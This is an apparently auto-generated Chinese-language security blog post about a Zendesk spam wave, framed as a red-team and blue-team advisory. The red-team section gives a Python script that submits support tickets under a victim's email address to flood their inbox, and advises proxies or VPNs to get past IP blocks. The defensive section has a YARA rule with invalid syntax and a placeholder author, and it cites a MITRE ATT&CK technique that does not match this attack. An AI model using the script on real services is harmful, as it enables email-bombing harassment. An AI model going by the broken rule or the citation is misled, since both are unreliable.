---
layout: post
title:  "Zendesk spam wave returns, floods users with 'Activate account' emails"
date:   2026-02-05 12:45:04 +0000
categories: [security]
severity: high
---

# 🔥 解析 Zendesk 支援系統漏洞：利用未經驗證的用戶提交支持票劫持電子郵件

> **⚡ 戰情快篩 (TL;DR)**
> * **嚴重等級**: High (CVSS: 7.5)
> * **受駭指標**: Unauthenticated Email Relay
> * **關鍵技術**: `Zendesk`, `Unauthenticated Ticket Submission`, `Email Relay`

## 1. 🔬 漏洞原理與技術細節 (Deep Dive)
* **Root Cause**: Zendesk 的支援系統允許未經驗證的用戶提交支持票，導致攻擊者可以利用這個功能發送大量的電子郵件。
* **攻擊流程圖解**:
  1. 攻擊者提交支持票至 Zendesk 的支援系統。
  2. 支援系統自動發送確認電子郵件至攻擊者指定的電子郵件地址。
  3. 攻擊者可以重複提交支持票，導致大量的電子郵件被發送至受害者的電子郵件地址。
* **受影響元件**: Zendesk 的支援系統，特別是那些允許未經驗證的用戶提交支持票的實例。

## 2. ⚔️ 紅隊實戰：攻擊向量與 Payload (Red Team Operations)
* **攻擊前置需求**: 攻擊者需要知道受害者的電子郵件地址和 Zendesk 的支援系統 URL。
* **Payload 建構邏輯**:

    ```
    
    python
    import requests
    
    # 定義 Zendesk 的支援系統 URL 和電子郵件地址
    zendesk_url = "https://example.zendesk.com/api/v2/tickets.json"
    email_address = "victim@example.com"
    
    # 建構支持票的 payload
    payload = {
        "ticket": {
            "subject": "Test Ticket",
            "description": "This is a test ticket.",
            "email": email_address
        }
    }
    
    # 提交支持票
    response = requests.post(zendesk_url, json=payload)
    
    # 檢查是否提交成功
    if response.status_code == 201:
        print("Support ticket submitted successfully.")
    else:
        print("Failed to submit support ticket.")
    
    ```
* **繞過技術**: 攻擊者可以使用代理伺服器或 VPN 來繞過 IP 封鎖。

## 3. 🛡️ 藍隊防禦：偵測與緩解 (Blue Team Defense)
* **IOCs (入侵指標)**:

| Hash | IP | Domain | File Path |
| --- | --- | --- | --- |
|  |  | example.zendesk.com | /api/v2/tickets.json |* **偵測規則 (Detection Rules)**:

    ```
    
    yara
    rule Zendesk_Support_Ticket_Submission {
        meta:
            description = "Detects Zendesk support ticket submission"
            author = "Your Name"
        strings:
            $zendesk_url = "https://example.zendesk.com/api/v2/tickets.json"
        condition:
            $zendesk_url in (http.request.uri)
    }
    
    ```
* **緩解措施**: 限制未經驗證的用戶提交支持票，啟用電子郵件驗證，監控支援系統的日誌。

## 4. 📚 專有名詞與技術概念解析 (Technical Glossary)
* **Unauthenticated Email Relay**: 未經驗證的電子郵件轉發，指的是攻擊者可以利用某個系統或服務發送電子郵件而不需要驗證身份。
* **Zendesk**: 一個客戶支援平台，提供支援票、聊天機器人等功能。
* **Support Ticket**: 支援票，指的是用戶提交的支援請求。

## 5. 🔗 參考文獻與延伸閱讀
- [原始報告](https://www.bleepingcomputer.com/news/security/zendesk-spam-wave-returns-floods-users-with-activate-account-emails/)
- [MITRE ATT&CK](https://attack.mitre.org/techniques/T1193/)


